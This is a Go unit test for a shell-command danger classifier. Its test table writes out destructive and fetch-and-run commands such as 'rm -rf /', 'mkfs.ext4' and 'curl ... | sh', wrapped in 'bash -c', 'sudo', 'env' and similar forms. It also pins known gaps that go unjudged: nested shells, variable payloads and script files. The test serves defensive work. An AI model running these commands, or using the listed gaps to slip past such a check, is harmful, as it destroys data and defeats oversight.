package engine

import "testing"

func dangerKindName(k dangerKind) string {
	switch k {
	case dangerNone:
		return "none"
	case dangerProject:
		return "project"
	case dangerSystem:
		return "system"
	}
	return "unknown"
}

// TestJudgeDanger_ShellPayload covers the `sh -c '<cmd>'` family: a shell
// payload is a command the shell would execute, so it must be judged like the
// outer command. Regression test for `bash -c "rm -rf /"`, which previously
// bypassed the judge entirely (no sh/bash case existed in judgeCall).
func TestJudgeDanger_ShellPayload(t *testing.T) {
	tests := []struct {
		name string
		cmd  string
		want dangerKind
	}{
		// Baseline (outer commands).
		{"root delete", `rm -rf /`, dangerSystem},
		{"project recursive force delete", `rm -rf /tmp/x`, dangerProject},
		{"downloader piped to shell", `curl http://x | sh`, dangerProject},
		{"mkfs prefix", `mkfs.ext4 /dev/sda1`, dangerSystem},
		// Shell payloads — same verdict as the outer form.
		{"bash -c root delete", `bash -c "rm -rf /"`, dangerSystem},
		{"sh -c project delete", `sh -c 'rm -rf /tmp/x'`, dangerProject},
		{"bash with leading flag", `bash --noprofile -c "rm -rf /"`, dangerSystem},
		{"sudo bash -c", `sudo bash -c "rm -rf /"`, dangerSystem},
		{"env assignment then bash -c", `env FOO=1 bash -c "rm -rf /"`, dangerSystem},
		{"fish -c", `fish -c "rm -rf /"`, dangerSystem},
		{"payload mkfs", `bash -c "mkfs.ext4 /dev/sda1"`, dangerSystem},
		{"payload downloader piped to shell", `bash -c "curl http://x | sh"`, dangerProject},
		// Bundled short options (`-lc`, `-ec`) and wrapper options (`env -i`,
		// `env -u NAME`, `command -p`) are the same class as bash -c: a plain
		// `== "-c"` comparison and a wrapper-flag-as-command unwrap both missed
		// them, leaving the payload unjudged (see isShellCommandFlag /
		// wrapperFlagTakesValue).
		{"bash bundled flags", `bash -lc "rm -rf /"`, dangerSystem},
		{"bash bundled -ec", `bash -ec "rm -rf /"`, dangerSystem},
		{"sh bundled flags", `sh -lc 'rm -rf /tmp/x'`, dangerProject},
		{"bundled flags after -o value", `bash -o pipefail -lc "rm -rf /"`, dangerSystem},
		{"long option is not a bundle", `bash --norc -c "rm -rf /"`, dangerSystem},
		{"env -i then bash -c", `env -i bash -c "rm -rf /"`, dangerSystem},
		{"env -u NAME then bash -c", `env -u FOO bash -c "rm -rf /"`, dangerSystem},
		{"command -p then bash -c", `command -p bash -c "rm -rf /"`, dangerSystem},
		// No false positives.
		{"harmless payload", `bash -c "ls -la"`, dangerNone},
		{"echoed danger string", `bash -c "echo rm -rf /"`, dangerNone},
		{"danger string in outer quotes", `echo "rm -rf /"`, dangerNone},
		{"danger string as search pattern", `grep "drop table" schema.sql`, dangerNone},
		{"harmless bundled payload", `bash -lc "ls -la"`, dangerNone},
		{"harmless long option payload", `bash --norc -c "ls -la"`, dangerNone},
		{"env -i harmless command", `env -i printenv PATH`, dangerNone},
		{"command -v is not a payload", `command -v rm`, dangerNone},
		{"env assignment then harmless command", `env FOO=1 ls`, dangerNone},
		// Known gaps, pinned so a future change to the depth limit is deliberate.
		{"non-literal payload is unjudgeable", `bash -c "$CMD"`, dangerNone},
		{"script file contents are not visible", `bash script.sh`, dangerNone},
		{"nesting beyond maxNestedShellDepth", `bash -c "bash -c 'rm -rf /'"`, dangerNone},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := judgeDanger(tt.cmd)
			if got.kind != tt.want {
				t.Errorf("judgeDanger(%q).kind = %s, want %s (reason: %q)",
					tt.cmd, dangerKindName(got.kind), dangerKindName(tt.want), got.reason)
			}
		})
	}
}
